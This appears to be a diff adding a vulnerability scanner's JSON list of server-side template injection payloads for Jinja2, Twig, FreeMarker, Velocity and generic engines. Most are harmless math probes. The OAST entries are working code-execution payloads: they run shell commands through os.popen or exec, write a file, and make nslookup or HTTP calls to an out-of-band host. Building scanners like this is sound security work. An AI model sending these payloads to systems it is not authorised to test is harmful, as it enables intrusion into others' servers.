@@ -1,0 +1,27 @@
+{
+  "vulnerability": "Server-Side Template Injection",
+  "category": "ssti",
+  "dialects": {
+    "jinja2": [
+      {"name": "Jinja2 Math", "type": "detection", "payload": "{{ 7*7 }}", "oast": false},
+      {"name": "Jinja2 Config", "type": "info_disclosure", "payload": "{{ config }}", "oast": false},
+      {"name": "Jinja2 OAST", "type": "oast", "payload": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('test') }}{{ config.__class__.__init__.__globals__['os'].popen('nslookup {oast_id}.oast.fun').read() }}", "oast": true}
+    ],
+    "twig": [
+      {"name": "Twig Math", "type": "detection", "payload": "{{ 7*7 }}", "oast": false},
+      {"name": "Twig OAST", "type": "oast", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('nslookup {oast_id}.oast.fun')}}", "oast": true}
+    ],
+    "freemarker": [
+      {"name": "FreeMarker Math", "type": "detection", "payload": "${7*7}", "oast": false},
+      {"name": "FreeMarker OAST", "type": "oast", "payload": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('http://{oast_id}.oast.fun/ssti').toURL().openStream()}", "oast": true}
+    ],
+    "velocity": [
+      {"name": "Velocity Math", "type": "detection", "payload": "#set($x=7*7)$x", "oast": false}
+    ],
+    "generic": [
+      {"name": "Generic Math Test", "type": "detection", "payload": "{{7*7}}", "oast": false},
+      {"name": "Generic Dollar Test", "type": "detection", "payload": "${7*7}", "oast": false},
+      {"name": "Generic Hash Test", "type": "detection", "payload": "#{7*7}", "oast": false}
+    ]
+  }
+}
